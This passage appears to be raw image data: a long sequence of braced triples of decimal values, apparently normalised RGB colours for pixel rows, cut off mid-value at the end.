{0.212,0.063,0.004},{0.239,0.082,0.012},{0.227,0.075,0.016},{0.212,0.059,0.02},{0.463,0.322,0.243},{0.745,0.643,0.545},{0.706,0.553,0.459},{0.839,0.714,0.667},{0.855,0.737,0.678},{0.859,0.745,0.686},{0.859,0.741,0.678},{0.851,0.733,0.667},{0.824,0.71,0.639},{0.788,0.686,0.596},{0.757,0.624,0.529},{0.757,0.604,0.498},{0.729,0.569,0.447},{0.706,0.537,0.424},{0.698,0.518,0.408},{0.678,0.49,0.365},{0.655,0.451,0.318},{0.612,0.404,0.263},{0.592,0.373,0.235},{0.561,0.341,0.212},{0.549,0.329,0.196},{0.533,0.302,0.169},{0.522,0.267,0.141},{0.506,0.247,0.122},{0.494,0.235,0.11},{0.471,0.224,0.086},{0.475,0.227,0.09},{0.447,0.208,0.078},{0.431,0.192,0.063},{0.404,0.169,0.051},{0.392,0.157,0.039},{0.376,0.157,0.027},{0.376,0.157,0.027},{0.404,0.188,0.035},{0.447,0.231,0.071},{0.502,0.29,0.118},{0.596,0.384,0.212},{0.655,0.459,0.306},{0.714,0.537,0.392},{0.741,0.592,0.431},{0.753,0.608,0.443},{0.757,0.616,0.451},{0.757,0.616,0.451},{0.757,0.596,0.447},{0.757,0.592,0.443},{0.761,0.584,0.431},{0.753,0.576,0.424},{0.753,0.58,0.42},{0.749,0.561,0.404},
{0.741,0.569,0.404},{0.741,0.573,0.408},{0.733,0.561,0.396},{0.737,0.557,0.396},{0.733,0.545,0.38},{0.725,0.541,0.376},{0.725,0.553,0.38},{0.722,0.537,0.365},{0.714,0.525,0.353},{0.702,0.51,0.341},{0.706,0.506,0.333},{0.765,0.62,0.643},{0.765,0.62,0.643},{0.875,0.788,0.722},{0.839,0.745,0.588},{0.533,0.42,0.275},{0.227,0.098,0.035},{0.478,0.294,0.216},{0.827,0.639,0.541},{0.859,0.694,0.592},{0.851,0.686,0.604},{0.867,0.733,0.675},{0.835,0.706,0.639},{0.431,0.353,0.298},{0.247,0.133,0.11},{0.545,0.337,0.271},{0.902,0.733,0.651},{0.878,0.69,0.561},{0.831,0.58,0.427},{0.765,0.463,0.278},{0.714,0.369,0.176},{0.655,0.318,0.122},{0.682,0.357,0.149},{0.761,0.463,0.255},{0.741,0.424,0.204},{0.678,0.349,0.118},{0.675,0.329,0.102},{0.655,0.298,0.078},{0.627,0.255,0.039},{0.592,0.216,0.016},{0.545,0.2,0.004},{0.467,0.149,0.012},{0.235,0.059,0.02},{0.196,0.059,0.016},{0.286,0.11,0.02},{0.263,0.075,0.008},{0.286,0.094,0.008},{0.333,0.125,0.012},{0.384,0.165,0.027},{0.435,0.204,0.051},{0.498,0.302,0.145},{0.58,0.443,0.306},{0.659,0.439,0.31},
{0.769,0.596,0.494},{0.847,0.718,0.663},{0.859,0.737,0.671},{0.863,0.753,0.686},{0.855,0.745,0.675},{0.863,0.749,0.667},{0.831,0.714,0.635},{0.8,0.694,0.608},{0.757,0.627,0.529},{0.745,0.592,0.475},{0.729,0.565,0.439},{0.71,0.537,0.416},{0.69,0.514,0.392},{0.675,0.486,0.357},{0.639,0.435,0.306},{0.62,0.412,0.267},{0.596,0.373,0.239},{0.576,0.357,0.22},{0.561,0.341,0.204},{0.541,0.31,0.176},{0.525,0.282,0.149},{0.514,0.255,0.129},{0.506,0.247,0.122},{0.478,0.231,0.094},{0.478,0.231,0.094},{0.455,0.208,0.075},{0.447,0.2,0.067},{0.424,0.18,0.059},{0.408,0.161,0.043},{0.396,0.153,0.024},{0.384,0.161,0.027},{0.396,0.176,0.039},{0.424,0.204,0.055},{0.475,0.263,0.086},{0.565,0.357,0.18},{0.643,0.439,0.282},{0.694,0.522,0.369},{0.729,0.584,0.424},{0.753,0.604,0.455},{0.761,0.62,0.467},{0.765,0.627,0.467},{0.776,0.612,0.471},{0.773,0.612,0.459},{0.773,0.592,0.443},{0.765,0.6,0.443},{0.757,0.592,0.431},{0.765,0.596,0.439},{0.749,0.588,0.427},{0.745,0.588,0.42},{0.753,0.576,0.412},{0.741,0.557,0.392},{0.741,0.553,0.392},{0.737,0.553,0.388},
{0.733,0.553,0.388},{0.718,0.533,0.369},{0.71,0.522,0.353},{0.706,0.514,0.345},{0.686,0.49,0.318},{0.824,0.8,0.831},{0.824,0.8,0.831},{0.671,0.412,0.431},{0.867,0.8,0.671},{0.8,0.671,0.494},{0.427,0.318,0.184},{0.212,0.075,0.027},{0.365,0.184,0.137},{0.78,0.612,0.545},{0.894,0.745,0.647},{0.839,0.678,0.604},{0.816,0.655,0.6},{0.733,0.573,0.51},{0.408,0.259,0.208},{0.651,0.475,0.408},{0.902,0.761,0.671},{0.902,0.749,0.639},{0.851,0.639,0.482},{0.792,0.518,0.318},{0.737,0.408,0.204},{0.682,0.341,0.125},{0.671,0.337,0.114},{0.659,0.337,0.11},{0.663,0.329,0.102},{0.671,0.333,0.11},{0.655,0.306,0.086},{0.627,0.251,0.043},{0.584,0.208,0.012},{0.549,0.188,0.008},{0.443,0.141,0.027},{0.192,0.051,0.016},{0.188,0.047,0.012},{0.298,0.094,0.024},{0.341,0.118,0.024},{0.392,0.157,0.016},{0.439,0.192,0.016},{0.455,0.208,0.027},{0.475,0.231,0.039},{0.482,0.235,0.039},{0.506,0.278,0.094},{0.533,0.329,0.157},{0.671,0.424,0.282},{0.812,0.655,0.573},{0.863,0.733,0.671},{0.875,0.753,0.686},{0.867,0.753,0.682},{0.851,0.741,0.671},{0.851,0.737,0.659},
{0.824,0.702,0.62},{0.788,0.671,0.576},{0.761,0.627,0.518},{0.741,0.588,0.467},{0.729,0.561,0.435},{0.71,0.533,0.412},{0.698,0.518,0.392},{0.682,0.49,0.361},{0.655,0.447,0.318},{0.631,0.42,0.278},{0.604,0.384,0.247},{0.588,0.369,0.231},{0.565,0.345,0.208},{0.541,0.31,0.176},{0.533,0.286,0.157},{0.518,0.259,0.133},{0.502,0.243,0.118},{0.486,0.239,0.102},{0.475,0.227,0.09},{0.455,0.208,0.071},{0.455,0.208,0.075},{0.439,0.192,0.059},{0.416,0.169,0.039},{0.408,0.161,0.031},{0.384,0.161,0.024},{0.384,0.165,0.031},{0.416,0.196,0.047},{0.451,0.239,0.071},{0.529,0.322,0.145},{0.616,0.412,0.239},{0.682,0.498,0.337},{0.729,0.58,0.42},{0.761,0.612,0.467},{0.765,0.62,0.475},{0.773,0.627,0.486},{0.788,0.624,0.49},{0.792,0.627,0.482},{0.78,0.616,0.459},{0.773,0.604,0.447},{0.769,0.596,0.443},{0.765,0.592,0.439},{0.761,0.592,0.431},{0.753,0.584,0.42},{0.753,0.573,0.408},{0.745,0.561,0.396},{0.737,0.553,0.388},{0.745,0.561,0.396},{0.741,0.557,0.392},{0.733,0.549,0.384},{0.718,0.529,0.365},{0.714,0.522,0.353},{0.69,0.494,0.322},{0.835,0.906,0.988},
{0.835,0.906,0.988},{0.702,0.416,0.4},{0.643,0.475,0.506},{0.835,0.733,0.627},{0.788,0.643,0.471},{0.412,0.263,0.125},{0.263,0.102,0.035},{0.404,0.22,0.137},{0.71,0.541,0.431},{0.867,0.718,0.62},{0.847,0.659,0.561},{0.733,0.541,0.42},{0.612,0.412,0.294},{0.686,0.49,0.412},{0.867,0.706,0.62},{0.91,0.745,0.659},{0.867,0.639,0.486},{0.784,0.49,0.29},{0.71,0.369,0.157},{0.635,0.271,0.067},{0.604,0.239,0.043},{0.639,0.29,0.09},{0.631,0.294,0.094},{0.616,0.275,0.071},{0.584,0.231,0.027},{0.561,0.196,0.008},{0.482,0.169,0.016},{0.353,0.106,0.012},{0.149,0.027,0.008},{0.212,0.059,0.008},{0.365,0.145,0.02},{0.38,0.137,0.02},{0.38,0.122,0.012},{0.408,0.141,0.016},{0.467,0.2,0.035},{0.529,0.255,0.063},{0.541,0.275,0.063},{0.541,0.278,0.063},{0.533,0.275,0.059},{0.514,0.251,0.055},{0.71,0.455,0.318},{0.835,0.714,0.631},{0.871,0.745,0.678},{0.875,0.753,0.69},{0.871,0.757,0.69},{0.847,0.737,0.667},{0.835,0.725,0.647},{0.827,0.702,0.616},{0.804,0.675,0.573},{0.765,0.624,0.514},{0.761,0.604,0.482},{0.749,0.576,0.451},{0.722,0.533,0.412},
{0.702,0.514,0.392},{0.686,0.49,0.357},{0.663,0.455,0.325},{0.643,0.435,0.294},{0.624,0.404,0.267},{0.592,0.373,0.235},{0.576,0.357,0.216},{0.557,0.325,0.188},{0.533,0.286,0.157},{0.529,0.275,0.145},{0.502,0.251,0.118},{0.49,0.243,0.106},{0.478,0.231,0.094},{0.467,0.22,0.082},{0.463,0.216,0.078},{0.451,0.204,0.067},{0.431,0.188,0.047},{0.42,0.176,0.043},{0.392,0.165,0.027},{0.376,0.153,0.024},{0.4,0.18,0.039},{0.439,0.231,0.059},{0.494,0.29,0.114},{0.588,0.38,0.2},{0.663,0.475,0.302},{0.725,0.58,0.412},{0.753,0.604,0.451},{0.769,0.627,0.486},{0.784,0.635,0.502},{0.796,0.635,0.51},{0.804,0.635,0.502},{0.784,0.635,0.478},{0.78,0.608,0.455},{0.776,0.604,0.451},{0.769,0.596,0.443},{0.761,0.588,0.427},{0.761,0.584,0.424},{0.757,0.576,0.416},{0.753,0.569,0.404},{0.745,0.561,0.396},{0.753,0.569,0.412},{0.737,0.553,0.388},{0.718,0.533,0.365},{0.706,0.518,0.349},{0.698,0.506,0.337},{0.682,0.486,0.314},{0.839,0.922,1},{0.839,0.922,1},{0.835,0.839,0.847},{0.553,0.216,0.29},{0.482,0.431,0.498},{0.694,0.588,0.51},{0.753,0.592,0.463},
{0.612,0.471,0.325},{0.408,0.275,0.133},{0.349,0.18,0.09},{0.443,0.282,0.176},{0.639,0.455,0.349},{0.776,0.596,0.471},{0.729,0.541,0.396},{0.675,0.471,0.341},{0.631,0.455,0.345},{0.702,0.541,0.447},{0.796,0.588,0.451},{0.741,0.471,0.294},{0.651,0.329,0.129},{0.573,0.231,0.051},{0.51,0.18,0.02},{0.498,0.173,0.016},{0.498,0.192,0.031},{0.486,0.192,0.047},{0.431,0.153,0.039},{0.337,0.102,0.024},{0.271,0.086,0.012},{0.345,0.145,0.024},{0.388,0.192,0.047},{0.451,0.239,0.071},{0.416,0.184,0.024},{0.451,0.208,0.035},{0.502,0.251,0.047},{0.525,0.275,0.063},{0.533,0.278,0.063},{0.533,0.267,0.035},{0.569,0.306,0.059},{0.604,0.345,0.098},{0.6,0.337,0.09},{0.612,0.353,0.071},{0.635,0.416,0.22},{0.855,0.741,0.663},{0.867,0.753,0.682},{0.871,0.753,0.694},{0.867,0.749,0.69},{0.855,0.737,0.667},{0.831,0.718,0.643},{0.827,0.702,0.62},{0.808,0.678,0.588},{0.761,0.62,0.518},{0.765,0.612,0.494},{0.753,0.58,0.447},{0.729,0.545,0.404},{0.706,0.51,0.373},{0.69,0.49,0.357},{0.667,0.455,0.322},{0.651,0.447,0.302},{0.616,0.408,0.267},{0.592,0.373,0.243},
{0.584,0.365,0.22},{0.565,0.341,0.196},{0.549,0.306,0.169},{0.525,0.278,0.141},{0.506,0.259,0.122},{0.498,0.251,0.114},{0.482,0.235,0.098},{0.475,0.227,0.09},{0.459,0.212,0.075},{0.455,0.208,0.071},{0.439,0.192,0.055},{0.427,0.18,0.043},{0.416,0.169,0.031},{0.38,0.161,0.024},{0.384,0.165,0.027},{0.424,0.212,0.047},{0.482,0.275,0.094},{0.561,0.361,0.173},{0.643,0.451,0.278},{0.71,0.553,0.376},{0.749,0.592,0.431},{0.765,0.584,0.431},{0.792,0.62,0.475},{0.808,0.647,0.506},{0.804,0.635,0.498},{0.792,0.639,0.494},{0.78,0.62,0.463},{0.78,0.608,0.455},{0.769,0.596,0.443},{0.761,0.592,0.431},{0.769,0.6,0.435},{0.761,0.584,0.424},{0.769,0.576,0.42},{0.749,0.561,0.4},{0.745,0.557,0.412},{0.737,0.553,0.38},{0.722,0.537,0.365},{0.706,0.514,0.345},{0.694,0.502,0.333},{0.675,0.478,0.306},{0.839,0.922,1},{0.839,0.922,1},{0.855,0.929,0.969},{0.757,0.545,0.549},{0.51,0.302,0.455},{0.361,0.302,0.376},{0.643,0.573,0.643},{0.729,0.686,0.635},{0.71,0.6,0.506},{0.69,0.557,0.42},{0.588,0.435,0.282},{0.494,0.31,0.157},{0.392,0.231,0.125},
{0.353,0.212,0.118},{0.318,0.176,0.082},{0.302,0.157,0.067},{0.204,0.09,0.039},{0.188,0.082,0.047},{0.282,0.153,0.106},{0.302,0.141,0.071},{0.282,0.102,0.039},{0.275,0.106,0.035},{0.239,0.102,0.047},{0.157,0.047,0.016},{0.169,0.063,0.027},{0.18,0.067,0.012},{0.251,0.098,0.016},{0.376,0.153,0.02},{0.408,0.188,0.031},{0.435,0.216,0.035},{0.467,0.259,0.071},{0.545,0.325,0.118},{0.6,0.384,0.157},{0.639,0.427,0.188},{0.639,0.427,0.184},{0.631,0.416,0.161},{0.659,0.427,0.165},{0.655,0.4,0.122},{0.631,0.357,0.086},{0.659,0.392,0.082},{0.682,0.431,0.051},{0.773,0.565,0.282},{0.863,0.749,0.678},{0.871,0.757,0.686},{0.871,0.753,0.694},{0.867,0.753,0.69},{0.855,0.741,0.667},{0.831,0.722,0.643},{0.82,0.694,0.612},{0.792,0.663,0.573},{0.773,0.631,0.525},{0.761,0.616,0.494},{0.757,0.596,0.459},{0.737,0.553,0.412},{0.714,0.518,0.38},{0.69,0.486,0.353},{0.675,0.463,0.329},{0.651,0.447,0.302},{0.627,0.42,0.278},{0.6,0.38,0.251},{0.588,0.369,0.224},{0.569,0.345,0.2},{0.549,0.306,0.165},{0.518,0.271,0.133},{0.51,0.263,0.125},{0.502,0.255,0.118},
{0.486,0.239,0.102},{0.475,0.227,0.09},{0.463,0.216,0.078},{0.455,0.208,0.071},{0.451,0.204,0.067},{0.439,0.192,0.055},{0.427,0.18,0.043},{0.388,0.169,0.031},{0.373,0.157,0.02},{0.4,0.192,0.035},{0.467,0.259,0.094},{0.553,0.341,0.157},{0.635,0.435,0.263},{0.71,0.533,0.369},{0.741,0.569,0.412},{0.631,0.396,0.278},{0.671,0.455,0.322},{0.8,0.635,0.494},{0.808,0.643,0.502},{0.8,0.651,0.506},{0.804,0.643,0.494},{0.796,0.624,0.471},{0.776,0.604,0.451},{0.773,0.6,0.439},{0.769,0.6,0.435},{0.761,0.588,0.424},{0.757,0.569,0.412},{0.745,0.557,0.396},{0.741,0.553,0.408},{0.729,0.545,0.373},{0.714,0.529,0.357},{0.698,0.506,0.337},{0.69,0.498,0.329},{0.659,0.463,0.286},{0.839,0.922,1},{0.839,0.922,1},{0.843,0.922,0.996},{0.855,0.91,0.965},{0.671,0.388,0.439},{0.518,0.329,0.459},{0.631,0.522,0.686},{0.545,0.404,0.447},{0.396,0.169,0.176},{0.463,0.212,0.196},{0.545,0.259,0.188},{0.518,0.192,0.114},{0.38,0.114,0.071},{0.275,0.094,0.055},{0.165,0.039,0.027},{0.125,0.024,0.012},{0.09,0.024,0.008},{0.098,0.027,0.008},{0.129,0.055,0.027},
{0.216,0.098,0.035},{0.306,0.149,0.047},{0.267,0.122,0.047},{0.196,0.071,0.02},{0.231,0.114,0.051},{0.271,0.129,0.047},{0.298,0.137,0.035},{0.373,0.18,0.024},{0.443,0.227,0.051},{0.529,0.302,0.11},{0.576,0.341,0.114},{0.631,0.412,0.176},{0.714,0.518,0.282},{0.749,0.561,0.333},{0.765,0.588,0.365},{0.765,0.596,0.384},{0.792,0.635,0.412},{0.784,0.616,0.38},{0.784,0.592,0.345},{0.769,0.573,0.31},{0.765,0.525,0.239},{0.725,0.482,0.11},{0.82,0.655,0.373},{0.871,0.757,0.682},{0.867,0.757,0.686},{0.859,0.745,0.675},{0.863,0.749,0.682},{0.843,0.729,0.655},{0.843,0.722,0.639},{0.827,0.694,0.612},{0.816,0.678,0.58},{0.788,0.647,0.541},{0.757,0.616,0.498},{0.753,0.604,0.475},{0.745,0.573,0.439},{0.729,0.529,0.396},{0.702,0.506,0.369},{0.682,0.478,0.345},{0.655,0.447,0.314},{0.639,0.431,0.298},{0.616,0.404,0.263},{0.6,0.376,0.235},{0.58,0.345,0.2},{0.561,0.31,0.169},{0.529,0.282,0.145},{0.51,0.263,0.125},{0.498,0.251,0.122},{0.486,0.239,0.106},{0.471,0.224,0.086},{0.467,0.22,0.082},{0.467,0.216,0.075},{0.455,0.204,0.063},{0.443,0.192,0.043},
{0.439,0.184,0.051},{0.404,0.161,0.035},{0.38,0.149,0.031},{0.388,0.169,0.027},{0.443,0.231,0.063},{0.529,0.322,0.122},{0.62,0.412,0.239},{0.706,0.514,0.349},{0.757,0.576,0.416},{0.627,0.392,0.275},{0.604,0.369,0.247},{0.804,0.627,0.482},{0.808,0.655,0.522},{0.808,0.663,0.525},{0.8,0.651,0.502},{0.792,0.631,0.478},{0.784,0.62,0.471},{0.769,0.596,0.443},{0.769,0.592,0.439},{0.761,0.584,0.431},{0.761,0.584,0.42},{0.753,0.573,0.408},{0.749,0.565,0.404},{0.737,0.553,0.38},{0.722,0.537,0.365},{0.706,0.518,0.345},{0.675,0.482,0.314},{0.643,0.455,0.271},{0.839,0.922,1},{0.839,0.922,1},{0.851,0.918,1},{0.851,0.925,0.988},{0.847,0.918,0.949},{0.773,0.643,0.675},{0.71,0.588,0.659},{0.769,0.678,0.737},{0.827,0.808,0.855},{0.882,0.827,0.839},{0.808,0.655,0.518},{0.584,0.388,0.235},{0.345,0.184,0.11},{0.427,0.314,0.239},{0.463,0.341,0.208},{0.42,0.263,0.125},{0.373,0.224,0.11},{0.298,0.157,0.059},{0.318,0.165,0.075},{0.412,0.231,0.118},{0.498,0.298,0.145},{0.416,0.208,0.075},{0.4,0.196,0.078},{0.467,0.29,0.145},{0.424,0.239,0.075},
{0.467,0.255,0.094},{0.549,0.322,0.129},{0.6,0.392,0.188},{0.624,0.424,0.22},{0.706,0.522,0.318},{0.745,0.58,0.376},{0.792,0.639,0.443},{0.824,0.686,0.498},{0.855,0.725,0.549},{0.89,0.769,0.592},{0.914,0.796,0.631},{0.898,0.784,0.616},{0.871,0.737,0.541},{0.843,0.694,0.482},{0.851,0.659,0.369},{0.784,0.565,0.227},{0.839,0.682,0.467},{0.867,0.757,0.678},{0.863,0.749,0.678},{0.855,0.745,0.671},{0.855,0.737,0.671},{0.851,0.737,0.663},{0.839,0.718,0.635},{0.824,0.69,0.604},{0.824,0.682,0.588},{0.8,0.659,0.553},{0.765,0.62,0.51},{0.749,0.6,0.475},{0.749,0.576,0.447},{0.741,0.541,0.408},{0.71,0.514,0.376},{0.686,0.49,0.353},{0.667,0.459,0.325},{0.647,0.439,0.302},{0.62,0.412,0.267},{0.604,0.376,0.239},{0.58,0.349,0.2},{0.569,0.318,0.176},{0.545,0.298,0.161},{0.51,0.263,0.125},{0.494,0.243,0.118},{0.49,0.243,0.114},{0.478,0.231,0.094},{0.471,0.224,0.086},{0.467,0.216,0.075},{0.459,0.208,0.067},{0.459,0.208,0.059},{0.447,0.192,0.055},{0.427,0.173,0.035},{0.396,0.157,0.035},{0.376,0.157,0.031},{0.424,0.208,0.047},{0.506,0.286,0.102},
{0.608,0.388,0.212},{0.698,0.502,0.337},{0.757,0.576,0.416},{0.753,0.569,0.416},{0.725,0.518,0.365},{0.804,0.631,0.486},{0.827,0.675,0.541},{0.812,0.671,0.533},{0.804,0.663,0.514},{0.808,0.647,0.502},{0.8,0.635,0.486},{0.769,0.596,0.443},{0.773,0.596,0.443},{0.765,0.588,0.435},{0.761,0.584,0.424},{0.765,0.58,0.416},{0.761,0.576,0.412},{0.737,0.553,0.384},{0.714,0.529,0.357},{0.694,0.506,0.337},{0.659,0.467,0.298},{0.635,0.435,0.259},{0.831,0.918,1},{0.831,0.918,1},{0.839,0.925,0.996},{0.847,0.922,0.992},{0.851,0.929,0.988},{0.847,0.933,0.988},{0.867,0.933,0.996},{0.867,0.929,0.988},{0.871,0.937,0.988},{0.875,0.929,0.992},{0.898,0.918,0.945},{0.835,0.749,0.624},{0.557,0.439,0.318},{0.667,0.549,0.451},{0.627,0.486,0.306},{0.675,0.514,0.325},{0.639,0.475,0.294},{0.522,0.361,0.192},{0.467,0.282,0.133},{0.439,0.243,0.094},{0.557,0.365,0.2},{0.62,0.408,0.212},{0.529,0.294,0.102},{0.675,0.49,0.29},{0.718,0.537,0.345},{0.69,0.49,0.282},{0.639,0.412,0.196},{0.702,0.506,0.29},{0.757,0.58,0.365},{0.804,0.651,0.459},{0.82,0.686,0.506},
{0.847,0.729,0.561},{0.875,0.78,0.616},{0.871,0.761,0.596},{0.847,0.71,0.537},{0.8,0.635,0.443},{0.796,0.6,0.392},{0.835,0.627,0.392},{0.859,0.655,0.404},{0.843,0.62,0.235},{0.831,0.604,0.235},{0.863,0.714,0.514},{0.855,0.749,0.678},{0.851,0.741,0.671},{0.851,0.741,0.667},{0.855,0.741,0.667},{0.855,0.741,0.655},{0.835,0.71,0.624},{0.827,0.69,0.604},{0.835,0.694,0.596},{0.816,0.675,0.569},{0.792,0.651,0.541},{0.757,0.608,0.486},{0.753,0.584,0.455},{0.737,0.549,0.416},{0.725,0.529,0.396},{0.706,0.51,0.373},{0.667,0.463,0.329},{0.651,0.443,0.306},{0.635,0.427,0.286},{0.608,0.392,0.251},{0.592,0.361,0.216},{0.58,0.333,0.196},{0.557,0.31,0.173},{0.525,0.278,0.141},{0.502,0.255,0.122},{0.482,0.243,0.11},{0.471,0.231,0.09},{0.478,0.231,0.09},{0.471,0.22,0.078},{0.463,0.212,0.071},{0.467,0.216,0.067},{0.451,0.2,0.055},{0.435,0.18,0.039},{0.416,0.161,0.027},{0.38,0.153,0.031},{0.4,0.184,0.035},{0.49,0.267,0.09},{0.588,0.369,0.176},{0.678,0.482,0.306},{0.753,0.573,0.408},{0.796,0.62,0.471},{0.804,0.639,0.49},{0.82,0.655,0.518},
{0.831,0.678,0.545},{0.812,0.671,0.533},{0.812,0.671,0.525},{0.812,0.651,0.514},{0.812,0.647,0.506},{0.796,0.62,0.471},{0.784,0.608,0.455},{0.773,0.596,0.443},{0.773,0.596,0.431},{0.757,0.573,0.412},{0.745,0.561,0.396},{0.722,0.541,0.373},{0.698,0.514,0.341},{0.686,0.494,0.325},{0.651,0.455,0.29},{0.62,0.42,0.231},{0.827,0.914,1},{0.827,0.914,1},{0.831,0.929,1},{0.843,0.922,1},{0.855,0.925,0.996},{0.855,0.929,0.996},{0.863,0.929,1},{0.859,0.925,0.996},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.867,0.937,0.992},{0.882,0.894,0.886},{0.765,0.682,0.58},{0.757,0.671,0.576},{0.804,0.698,0.557},{0.745,0.62,0.455},{0.82,0.71,0.557},{0.808,0.69,0.525},{0.651,0.478,0.294},{0.569,0.365,0.157},{0.596,0.4,0.196},{0.706,0.502,0.294},{0.655,0.424,0.18},{0.639,0.416,0.173},{0.729,0.533,0.318},{0.741,0.569,0.349},{0.769,0.576,0.353},{0.741,0.565,0.341},{0.824,0.667,0.455},{0.824,0.69,0.506},{0.847,0.729,0.561},{0.871,0.769,0.627},{0.875,0.792,0.682},{0.902,0.824,0.718},{0.918,0.851,0.725},{0.914,0.824,0.69},{0.91,0.776,0.596},
{0.855,0.69,0.455},{0.847,0.671,0.404},{0.89,0.71,0.4},{0.839,0.643,0.275},{0.855,0.71,0.478},{0.835,0.733,0.659},{0.835,0.725,0.655},{0.843,0.725,0.655},{0.843,0.733,0.643},{0.843,0.725,0.631},{0.843,0.714,0.62},{0.835,0.694,0.6},{0.839,0.698,0.596},{0.824,0.686,0.573},{0.796,0.651,0.545},{0.765,0.616,0.506},{0.741,0.58,0.455},{0.737,0.561,0.424},{0.729,0.537,0.408},{0.71,0.518,0.388},{0.686,0.49,0.357},{0.667,0.459,0.318},{0.647,0.443,0.298},{0.612,0.404,0.259},{0.6,0.373,0.227},{0.58,0.337,0.2},{0.569,0.322,0.184},{0.537,0.29,0.153},{0.502,0.263,0.122},{0.482,0.259,0.114},{0.475,0.251,0.098},{0.475,0.235,0.09},{0.478,0.227,0.086},{0.463,0.212,0.071},{0.471,0.22,0.071},{0.455,0.204,0.055},{0.443,0.184,0.047},{0.435,0.176,0.039},{0.396,0.157,0.024},{0.396,0.176,0.027},{0.471,0.247,0.071},{0.569,0.349,0.153},{0.663,0.451,0.275},{0.741,0.557,0.388},{0.784,0.612,0.451},{0.804,0.643,0.49},{0.824,0.659,0.533},{0.827,0.682,0.549},{0.831,0.686,0.557},{0.816,0.675,0.541},{0.827,0.667,0.537},{0.824,0.655,0.518},{0.804,0.627,0.478},
{0.8,0.624,0.471},{0.788,0.612,0.459},{0.776,0.6,0.435},{0.761,0.576,0.416},{0.737,0.553,0.384},{0.725,0.549,0.373},{0.694,0.51,0.337},{0.678,0.478,0.318},{0.643,0.443,0.275},{0.62,0.424,0.227},{0.827,0.914,1},{0.827,0.914,1},{0.827,0.922,1},{0.843,0.922,1},{0.847,0.922,0.988},{0.859,0.933,1},{0.863,0.929,1},{0.867,0.933,0.996},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.863,0.933,0.996},{0.878,0.933,0.992},{0.851,0.831,0.788},{0.851,0.769,0.671},{0.871,0.827,0.741},{0.867,0.8,0.678},{0.855,0.788,0.667},{0.863,0.784,0.655},{0.855,0.757,0.584},{0.78,0.612,0.373},{0.745,0.553,0.314},{0.737,0.557,0.337},{0.745,0.549,0.302},{0.725,0.486,0.227},{0.729,0.494,0.247},{0.792,0.62,0.38},{0.812,0.659,0.416},{0.816,0.651,0.416},{0.835,0.686,0.475},{0.871,0.753,0.565},{0.871,0.757,0.596},{0.882,0.773,0.639},{0.882,0.788,0.667},{0.894,0.824,0.706},{0.953,0.902,0.796},{0.953,0.886,0.8},{0.929,0.843,0.725},{0.933,0.824,0.706},{0.945,0.82,0.639},{0.902,0.765,0.506},{0.941,0.796,0.529},{0.894,0.761,0.588},{0.831,0.698,0.627},
{0.816,0.686,0.627},{0.82,0.694,0.627},{0.824,0.71,0.624},{0.824,0.706,0.608},{0.839,0.706,0.612},{0.843,0.702,0.604},{0.835,0.698,0.58},{0.824,0.682,0.565},{0.804,0.659,0.553},{0.761,0.612,0.502},{0.749,0.588,0.463},{0.733,0.561,0.424},{0.722,0.541,0.408},{0.698,0.518,0.384},{0.69,0.506,0.369},{0.678,0.478,0.333},{0.667,0.463,0.318},{0.624,0.416,0.271},{0.6,0.373,0.227},{0.588,0.345,0.208},{0.569,0.322,0.184},{0.549,0.302,0.165},{0.514,0.271,0.129},{0.478,0.259,0.114},{0.475,0.251,0.098},{0.482,0.243,0.098},{0.482,0.227,0.09},{0.475,0.224,0.082},{0.467,0.216,0.067},{0.455,0.204,0.055},{0.451,0.192,0.055},{0.443,0.184,0.047},{0.416,0.165,0.02},{0.396,0.157,0.027},{0.455,0.22,0.047},{0.557,0.325,0.133},{0.647,0.424,0.235},{0.737,0.537,0.357},{0.78,0.604,0.443},{0.796,0.635,0.482},{0.824,0.659,0.533},{0.824,0.678,0.545},{0.831,0.686,0.557},{0.843,0.69,0.561},{0.843,0.678,0.549},{0.831,0.663,0.525},{0.816,0.639,0.49},{0.804,0.627,0.475},{0.788,0.612,0.459},{0.784,0.608,0.447},{0.765,0.58,0.424},{0.737,0.553,0.384},{0.706,0.537,0.357},
{0.682,0.498,0.325},{0.643,0.447,0.267},{0.627,0.431,0.239},{0.678,0.498,0.204},{0.827,0.914,1},{0.827,0.914,1},{0.835,0.918,1},{0.839,0.922,1},{0.847,0.922,0.992},{0.855,0.929,0.996},{0.859,0.929,0.996},{0.859,0.929,0.996},{0.863,0.929,0.996},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.875,0.89,0.902},{0.894,0.82,0.714},{0.867,0.812,0.71},{0.902,0.835,0.749},{0.898,0.835,0.722},{0.89,0.812,0.686},{0.875,0.8,0.659},{0.859,0.741,0.545},{0.816,0.663,0.447},{0.792,0.624,0.392},{0.796,0.624,0.38},{0.769,0.569,0.29},{0.776,0.561,0.271},{0.82,0.631,0.384},{0.843,0.69,0.475},{0.863,0.729,0.525},{0.835,0.686,0.475},{0.875,0.753,0.573},{0.898,0.788,0.627},{0.867,0.761,0.58},{0.871,0.769,0.592},{0.886,0.792,0.639},{0.914,0.824,0.678},{0.941,0.859,0.722},{0.957,0.878,0.749},{0.961,0.875,0.749},{0.969,0.878,0.757},{0.976,0.882,0.725},{0.953,0.792,0.42},{0.878,0.698,0.38},{0.78,0.647,0.561},{0.773,0.635,0.561},{0.788,0.643,0.569},{0.808,0.671,0.569},{0.82,0.69,0.58},{0.835,0.694,0.592},{0.831,0.69,0.588},
{0.827,0.686,0.58},{0.831,0.678,0.569},{0.82,0.671,0.565},{0.773,0.624,0.514},{0.753,0.604,0.475},{0.733,0.584,0.443},{0.718,0.557,0.435},{0.706,0.533,0.408},{0.69,0.502,0.369},{0.686,0.482,0.337},{0.675,0.471,0.325},{0.647,0.439,0.294},{0.62,0.4,0.255},{0.596,0.373,0.231},{0.576,0.333,0.196},{0.557,0.314,0.176},{0.51,0.29,0.145},{0.49,0.267,0.122},{0.49,0.255,0.11},{0.486,0.239,0.094},{0.486,0.227,0.09},{0.482,0.224,0.078},{0.475,0.22,0.071},{0.467,0.212,0.063},{0.455,0.2,0.051},{0.451,0.196,0.047},{0.431,0.176,0.035},{0.412,0.153,0.027},{0.443,0.192,0.043},{0.545,0.298,0.11},{0.624,0.388,0.204},{0.702,0.502,0.322},{0.78,0.588,0.431},{0.808,0.627,0.486},{0.816,0.663,0.525},{0.824,0.671,0.545},{0.831,0.682,0.553},{0.843,0.69,0.561},{0.831,0.686,0.553},{0.82,0.675,0.529},{0.808,0.659,0.498},{0.792,0.62,0.467},{0.792,0.616,0.455},{0.